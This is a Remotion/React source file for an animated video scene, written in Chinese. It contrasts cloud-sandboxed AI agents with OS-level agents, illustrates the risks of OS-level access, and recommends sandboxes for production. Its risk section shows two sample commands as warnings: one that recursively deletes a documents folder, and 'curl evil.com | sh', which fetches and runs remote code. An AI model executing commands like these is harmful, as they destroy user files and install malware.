/**
 * Scene19-OSLevelVsCloud: 云端沙箱 vs OS-level Agent 对比（一镜到底）
 * 1200帧/40秒（优化版）
 *
 * 时间轴：
 * - 0-300:     左右对比出现（云端沙箱 vs OS-level）
 * - 300-750:   风险具象化：展示OS-level的具体风险场景（误删文件、执行危险命令）
 * - 750-1200:  解决方案分层：上层生产环境用沙盒，下层开发环境用 OS-level
 */

import React from 'react';
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  interpolate,
  spring,
} from 'remotion';
import { colors } from '../lib/utils';
import { fontStack } from '../lib/fonts';

const TIMELINE = {
  introStart: 0,
  introEnd: 300,
  riskStart: 300,
  riskEnd: 750,
  solutionStart: 750,
  solutionEnd: 1200,
} as const;

export const Scene19OSLevelVsCloud: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  const T = TIMELINE;

  return (
    <AbsoluteFill
      style={{
        backgroundColor: colors.background,
        fontFamily: fontStack,
        overflow: 'hidden',
      }}
    >
      {/* 阶段 1：左右对比 */}
      {frame < T.riskStart + 60 && (
        <ComparisonPhase frame={frame} fps={fps} timeline={T} />
      )}

      {/* 阶段 2：风险具象化 */}
      {frame >= T.riskStart - 60 && frame < T.solutionStart + 60 && (
        <RiskPhase frame={frame} fps={fps} timeline={T} />
      )}

      {/* 阶段 3：解决方案 */}
      {frame >= T.solutionStart - 60 && (
        <SolutionPhase frame={frame} fps={fps} timeline={T} />
      )}

      {/* 阶段指示器 */}
      <PhaseIndicator frame={frame} timeline={T} />
    </AbsoluteFill>
  );
};

// 对比阶段（精简版）
const ComparisonPhase: React.FC<{
  frame: number;
  fps: number;
  timeline: typeof TIMELINE;
}> = ({ frame, fps, timeline }) => {
  const T = timeline;

  // 左右卡片入场
  const leftEnter = spring({
    frame: frame - T.introStart,
    fps,
    config: { damping: 15, stiffness: 120 },
  });
  const rightEnter = spring({
    frame: frame - T.introStart - 10,
    fps,
    config: { damping: 15, stiffness: 120 },
  });

  // 详情展示进度（加速）
  const detailProgress = interpolate(
    frame,
    [T.introStart + 60, T.introStart + 180],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  return (
    <AbsoluteFill>
      {/* 标题 */}
      <div
        style={{
          position: 'absolute',
          top: 50,
          left: 0,
          right: 0,
          textAlign: 'center',
        }}
      >
        <span style={{ fontSize: 22, color: colors.textMuted }}>Part 2</span>
        <br />
        <span style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>
          云端沙箱 vs OS-level Agent
        </span>
      </div>

      {/* 核心差异标签 */}
      <div
        style={{
          position: 'absolute',
          top: 110,
          left: 0,
          right: 0,
          textAlign: 'center',
          opacity: detailProgress,
        }}
      >
        <span
          style={{
            fontSize: 18,
            color: colors.accent,
            backgroundColor: `${colors.accent}15`,
            padding: '6px 16px',
            borderRadius: 20,
          }}
        >
          核心差异：能否访问本地文件
        </span>
      </div>

      {/* 左右对比区域 */}
      <div
        style={{
          position: 'absolute',
          top: 160,
          left: 0,
          right: 0,
          bottom: 120,
          display: 'flex',
          justifyContent: 'center',
          gap: 60,
          alignItems: 'center',
        }}
      >
        {/* 左：云端沙箱 */}
        <div
          style={{
            width: 450,
            height: 480,
            opacity: leftEnter,
            transform: `translateX(${(1 - leftEnter) * -80}px)`,
          }}
        >
          <div
            style={{
              height: '100%',
              backgroundColor: colors.backgroundCard,
              borderRadius: 20,
              border: `2px solid ${colors.error}`,
              padding: 28,
              display: 'flex',
              flexDirection: 'column',
            }}
          >
            <div
              style={{
                fontSize: 26,
                fontWeight: 700,
                color: colors.error,
                textAlign: 'center',
                marginBottom: 20,
              }}
            >
              ☁️ 云端沙箱 Agent
            </div>

            {/* 示意图 */}
            <div
              style={{
                flex: 1,
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 16,
              }}
            >
              {/* Agent 图标 */}
              <div
                style={{
                  width: 100,
                  height: 100,
                  borderRadius: '50%',
                  backgroundColor: `${colors.primary}20`,
                  border: `2px solid ${colors.primary}`,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: 40,
                  opacity: detailProgress,
                }}
              >
                🤖
              </div>

              {/* 断开的虚线 */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                  opacity: detailProgress,
                }}
              >
                <div
                  style={{
                    width: 50,
                    height: 3,
                    background: `repeating-linear-gradient(90deg, ${colors.error}, ${colors.error} 5px, transparent 5px, transparent 10px)`,
                  }}
                />
                <span style={{ fontSize: 32, color: colors.error }}>✗</span>
                <div
                  style={{
                    width: 50,
                    height: 3,
                    background: `repeating-linear-gradient(90deg, ${colors.error}, ${colors.error} 5px, transparent 5px, transparent 10px)`,
                  }}
                />
              </div>

              {/* 本地文件（带锁） */}
              <div
                style={{
                  padding: '14px 20px',
                  backgroundColor: `${colors.error}15`,
                  borderRadius: 10,
                  border: `1px dashed ${colors.error}`,
                  opacity: detailProgress,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 10,
                }}
              >
                <span style={{ fontSize: 24 }}>📁</span>
                <span style={{ fontSize: 18, color: colors.textMuted }}>
                  本地文件
                </span>
                <span style={{ fontSize: 20 }}>🔒</span>
              </div>

              {/* 说明 */}
              <div
                style={{
                  fontSize: 16,
                  color: colors.textDark,
                  textAlign: 'center',
                  marginTop: 12,
                  opacity: detailProgress,
                  lineHeight: 1.5,
                }}
              >
                运行在远程容器
                <br />
                无法访问你的工作目录
              </div>
            </div>
          </div>
        </div>

        {/* 右：OS-level Agent */}
        <div
          style={{
            width: 450,
            height: 480,
            opacity: rightEnter,
            transform: `translateX(${(1 - rightEnter) * 80}px)`,
          }}
        >
          <div
            style={{
              height: '100%',
              backgroundColor: colors.backgroundCard,
              borderRadius: 20,
              border: `2px solid ${colors.success}`,
              padding: 28,
              display: 'flex',
              flexDirection: 'column',
            }}
          >
            <div
              style={{
                fontSize: 26,
                fontWeight: 700,
                color: colors.success,
                textAlign: 'center',
                marginBottom: 20,
              }}
            >
              💻 OS-level Agent
            </div>

            {/* 示意图 */}
            <div
              style={{
                flex: 1,
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 16,
              }}
            >
              {/* Agent 图标 */}
              <div
                style={{
                  width: 100,
                  height: 100,
                  borderRadius: '50%',
                  backgroundColor: `${colors.success}20`,
                  border: `2px solid ${colors.success}`,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: 40,
                  opacity: detailProgress,
                }}
              >
                🤖
              </div>

              {/* 实线连接 */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                  opacity: detailProgress,
                }}
              >
                <div
                  style={{
                    width: 50,
                    height: 3,
                    backgroundColor: colors.success,
                  }}
                />
                <span style={{ fontSize: 32, color: colors.success }}>✓</span>
                <div
                  style={{
                    width: 50,
                    height: 3,
                    backgroundColor: colors.success,
                  }}
                />
              </div>

              {/* 本地文件（解锁） */}
              <div
                style={{
                  padding: '14px 20px',
                  backgroundColor: `${colors.success}15`,
                  borderRadius: 10,
                  border: `1px solid ${colors.success}`,
                  opacity: detailProgress,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 10,
                }}
              >
                <span style={{ fontSize: 24 }}>📁</span>
                <span style={{ fontSize: 18, color: colors.text }}>
                  本地文件
                </span>
                <span style={{ fontSize: 20 }}>🔓</span>
              </div>

              {/* 说明 */}
              <div
                style={{
                  fontSize: 16,
                  color: colors.textDark,
                  textAlign: 'center',
                  marginTop: 12,
                  opacity: detailProgress,
                  lineHeight: 1.5,
                }}
              >
                直接运行在你的机器上
                <br />
                完全访问本地文件和工具
              </div>
            </div>
          </div>
        </div>
      </div>
    </AbsoluteFill>
  );
};

// 风险具象化阶段（新增）
const RiskPhase: React.FC<{
  frame: number;
  fps: number;
  timeline: typeof TIMELINE;
}> = ({ frame, fps, timeline }) => {
  const T = timeline;

  const enterProgress = interpolate(
    frame,
    [T.riskStart, T.riskStart + 60],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  // 两个风险场景依次展示
  const scene1Progress = interpolate(
    frame,
    [T.riskStart + 80, T.riskStart + 200],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  const scene2Progress = interpolate(
    frame,
    [T.riskStart + 250, T.riskStart + 370],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  // 背景变红程度
  const bgRedness = interpolate(
    frame,
    [T.riskStart, T.riskStart + 100],
    [0, 0.12],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  return (
    <AbsoluteFill
      style={{
        backgroundColor: `rgba(239, 68, 68, ${bgRedness})`,
        opacity: enterProgress,
      }}
    >
      {/* 标题 */}
      <div
        style={{
          position: 'absolute',
          top: 50,
          left: 0,
          right: 0,
          textAlign: 'center',
        }}
      >
        <div
          style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: 12,
            backgroundColor: `${colors.error}20`,
            padding: '12px 24px',
            borderRadius: 12,
            border: `2px solid ${colors.error}`,
          }}
        >
          <span style={{ fontSize: 32 }}>⚠️</span>
          <span style={{ fontSize: 28, fontWeight: 700, color: colors.error }}>
            OS-level Agent 的风险
          </span>
        </div>
      </div>

      {/* 风险场景展示 */}
      <div
        style={{
          position: 'absolute',
          top: 140,
          left: 0,
          right: 0,
          bottom: 120,
          display: 'flex',
          justifyContent: 'center',
          gap: 50,
          alignItems: 'center',
        }}
      >
        {/* 风险场景1：误删文件 */}
        <div
          style={{
            width: 420,
            height: 380,
            backgroundColor: colors.backgroundCard,
            borderRadius: 16,
            border: `2px solid ${colors.error}`,
            padding: 24,
            opacity: scene1Progress,
            transform: `translateY(${(1 - scene1Progress) * 30}px)`,
          }}
        >
          <div
            style={{
              fontSize: 20,
              fontWeight: 700,
              color: colors.error,
              marginBottom: 16,
              display: 'flex',
              alignItems: 'center',
              gap: 8,
            }}
          >
            <span>🗑️</span>
            场景1：误删重要文件
          </div>

          {/* 模拟命令 */}
          <div
            style={{
              backgroundColor: 'rgba(15, 15, 26, 0.8)',
              borderRadius: 10,
              padding: 16,
              fontFamily: "'Fira Code', monospace",
              fontSize: 15,
              marginBottom: 16,
            }}
          >
            <span style={{ color: colors.textMuted }}>$</span>{' '}
            <span style={{ color: colors.error }}>rm -rf ~/Documents/</span>
            <span style={{ color: colors.textMuted }}>project/</span>
          </div>

          {/* 后果 */}
          <div
            style={{
              padding: 14,
              backgroundColor: `${colors.error}15`,
              borderRadius: 8,
              borderLeft: `4px solid ${colors.error}`,
            }}
          >
            <div style={{ fontSize: 15, color: colors.text, marginBottom: 8 }}>
              后果：
            </div>
            <div style={{ fontSize: 14, color: colors.textDark, lineHeight: 1.6 }}>
              • 项目代码永久丢失
              <br />
              • 未提交的改动无法恢复
              <br />
              • 可能需要从备份恢复
            </div>
          </div>
        </div>

        {/* 风险场景2：执行危险命令 */}
        <div
          style={{
            width: 420,
            height: 380,
            backgroundColor: colors.backgroundCard,
            borderRadius: 16,
            border: `2px solid ${colors.error}`,
            padding: 24,
            opacity: scene2Progress,
            transform: `translateY(${(1 - scene2Progress) * 30}px)`,
          }}
        >
          <div
            style={{
              fontSize: 20,
              fontWeight: 700,
              color: colors.error,
              marginBottom: 16,
              display: 'flex',
              alignItems: 'center',
              gap: 8,
            }}
          >
            <span>💣</span>
            场景2：执行恶意指令
          </div>

          {/* 模拟命令 */}
          <div
            style={{
              backgroundColor: 'rgba(15, 15, 26, 0.8)',
              borderRadius: 10,
              padding: 16,
              fontFamily: "'Fira Code', monospace",
              fontSize: 15,
              marginBottom: 16,
            }}
          >
            <span style={{ color: colors.textMuted }}>$</span>{' '}
            <span style={{ color: colors.error }}>curl evil.com</span>
            <span style={{ color: colors.textMuted }}> | sh</span>
          </div>

          {/* 后果 */}
          <div
            style={{
              padding: 14,
              backgroundColor: `${colors.error}15`,
              borderRadius: 8,
              borderLeft: `4px solid ${colors.error}`,
            }}
          >
            <div style={{ fontSize: 15, color: colors.text, marginBottom: 8 }}>
              后果：
            </div>
            <div style={{ fontSize: 14, color: colors.textDark, lineHeight: 1.6 }}>
              • 系统被植入恶意软件
              <br />
              • 敏感数据泄露风险
              <br />
              • 可能被加入僵尸网络
            </div>
          </div>
        </div>
      </div>

      {/* 底部提示 */}
      <div
        style={{
          position: 'absolute',
          bottom: 140,
          left: 0,
          right: 0,
          textAlign: 'center',
          opacity: interpolate(
            frame,
            [T.riskStart + 320, T.riskStart + 380],
            [0, 1],
            { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
          ),
        }}
      >
        <span style={{ fontSize: 18, color: colors.textMuted }}>
          Agent 有权限执行任何命令，包括危险操作
        </span>
      </div>
    </AbsoluteFill>
  );
};

// 解决方案阶段（简化）
const SolutionPhase: React.FC<{
  frame: number;
  fps: number;
  timeline: typeof TIMELINE;
}> = ({ frame, fps, timeline }) => {
  const T = timeline;

  const enterSpring = spring({
    frame: frame - T.solutionStart,
    fps,
    config: { damping: 15, stiffness: 100 },
  });

  // 生产环境层
  const prodProgress = interpolate(
    frame,
    [T.solutionStart + 50, T.solutionStart + 150],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  // 开发环境层
  const devProgress = interpolate(
    frame,
    [T.solutionStart + 120, T.solutionStart + 220],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  // 金句
  const quoteOpacity = interpolate(
    frame,
    [T.solutionStart + 280, T.solutionStart + 340],
    [0, 1],
    { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' },
  );

  return (
    <AbsoluteFill
      style={{
        opacity: enterSpring,
        transform: `translateY(${(1 - enterSpring) * 50}px)`,
      }}
    >
      {/* 标题 */}
      <div
        style={{
          position: 'absolute',
          top: 50,
          left: 0,
          right: 0,
          textAlign: 'center',
        }}
      >
        <span style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>
          如何解决？分层方案
        </span>
      </div>

      {/* 分层图 */}
      <div
        style={{
          position: 'absolute',
          top: 130,
          left: '50%',
          transform: 'translateX(-50%)',
          width: 700,
          display: 'flex',
          flexDirection: 'column',
          gap: 20,
        }}
      >
        {/* 上层：生产环境 */}
        <div
          style={{
            backgroundColor: `${colors.warning}15`,
            borderRadius: 16,
            border: `2px solid ${colors.warning}`,
            padding: 24,
            opacity: prodProgress,
            transform: `translateY(${(1 - prodProgress) * 40}px)`,
          }}
        >
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              marginBottom: 12,
            }}
          >
            <div style={{ fontSize: 22, fontWeight: 700, color: colors.warning }}>
              🔒 生产环境
            </div>
            <span
              style={{
                fontSize: 14,
                color: colors.warning,
                backgroundColor: `${colors.warning}20`,
                padding: '4px 12px',
                borderRadius: 4,
              }}
            >
              安全第一
            </span>
          </div>
          <div
            style={{
              fontSize: 16,
              color: colors.textMuted,
              marginBottom: 14,
            }}
          >
            使用沙盒隔离 Agent，限制文件和命令访问权限
          </div>
          <div style={{ display: 'flex', gap: 12 }}>
            {['E2B', 'Docker', 'Firecracker'].map((tool, i) => (
              <div
                key={i}
                style={{
                  padding: '8px 16px',
                  backgroundColor: `${colors.warning}20`,
                  borderRadius: 6,
                  fontSize: 16,
                  color: colors.warning,
                  fontFamily: "'Fira Code', monospace",
                }}
              >
                {tool}
              </div>
            ))}
          </div>
        </div>

        {/* 中间箭头 */}
        <div
          style={{
            textAlign: 'center',
            fontSize: 24,
            color: colors.textDark,
            opacity: Math.min(prodProgress, devProgress),
          }}
        >
          ↓ 根据场景选择 ↓
        </div>

        {/* 下层：开发环境 */}
        <div
          style={{
            backgroundColor: `${colors.success}15`,
            borderRadius: 16,
            border: `2px solid ${colors.success}`,
            padding: 24,
            opacity: devProgress,
            transform: `translateY(${(1 - devProgress) * 40}px)`,
          }}
        >
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              marginBottom: 12,
            }}
          >
            <div style={{ fontSize: 22, fontWeight: 700, color: colors.success }}>
              ⚡ 开发/个人环境
            </div>
            <span
              style={{
                fontSize: 14,
                color: colors.success,
                backgroundColor: `${colors.success}20`,
                padding: '4px 12px',
                borderRadius: 4,
              }}
            >
              效率优先
            </span>
          </div>
          <div
            style={{
              fontSize: 16,
              color: colors.textMuted,
              marginBottom: 14,
            }}
          >
            直接使用 OS-level Agent，无缝访问本地文件和工具
          </div>
          <div style={{ display: 'flex', gap: 12 }}>
            {['Claude Code', 'Cursor', 'Local Tools'].map((tool, i) => (
              <div
                key={i}
                style={{
                  padding: '8px 16px',
                  backgroundColor: `${colors.success}20`,
                  borderRadius: 6,
                  fontSize: 16,
                  color: colors.success,
                  fontFamily: "'Fira Code', monospace",
                }}
              >
                {tool}
              </div>
            ))}
          </div>
        </div>

        {/* 金句 */}
        <div
          style={{
            textAlign: 'center',
            marginTop: 20,
            opacity: quoteOpacity,
          }}
        >
          <div
            style={{
              fontSize: 26,
              fontWeight: 700,
              color: colors.accent,
              fontStyle: 'italic',
            }}
          >
            "安全用沙盒，效率用 OS-level"
          </div>
        </div>
      </div>
    </AbsoluteFill>
  );
};

// 阶段指示器
const PhaseIndicator: React.FC<{
  frame: number;
  timeline: typeof TIMELINE;
}> = ({ frame, timeline }) => {
  const T = timeline;

  const steps = [
    { label: '对比', end: T.riskEnd },
    { label: '风险', end: T.solutionEnd },
    { label: '方案', end: T.solutionEnd + 100 },
  ];

  const currentStep =
    frame < T.riskStart
      ? 0
      : frame < T.solutionStart
        ? 1
        : 2;

  return (
    <div
      style={{
        position: 'absolute',
        bottom: 34,
        left: '50%',
        transform: 'translateX(-50%)',
        display: 'flex',
        gap: 26,
      }}
    >
      {steps.map((step, i) => {
        const isActive = i === currentStep;
        const isDone = i < currentStep;
        return (
          <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <div
              style={{
                width: 10,
                height: 10,
                borderRadius: '50%',
                backgroundColor: isDone
                  ? colors.accent
                  : isActive
                    ? colors.primary
                    : colors.textDark,
              }}
            />
            <span
              style={{
                fontSize: 18,
                color: isActive ? colors.text : colors.textDark,
                fontFamily: fontStack,
              }}
            >
              {step.label}
            </span>
          </div>
        );
      })}
    </div>
  );
};
